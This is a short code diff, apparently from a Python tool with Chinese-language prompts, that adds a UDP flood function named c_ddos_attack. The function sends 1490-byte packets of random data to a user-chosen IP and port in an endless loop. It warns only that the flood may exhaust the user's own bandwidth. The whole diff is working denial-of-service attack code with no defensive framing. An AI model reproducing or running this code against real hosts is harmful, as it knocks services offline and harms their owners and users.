@@ -86,4 +86,15 @@ def ddos_attack(ip):
         print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
         if port == 65534:
             port = 1
+# 洪攻击
+def c_ddos_attack(ip):
+    sent = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+    meo.screen.red_font("注意！此功能极有可能耗尽你的宽带")
+    port = int(input("请输入目标端口:"))
+    while True:
+        sock.sendto(bytes, (ip,port))
+        sent = sent + 1
+        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
 
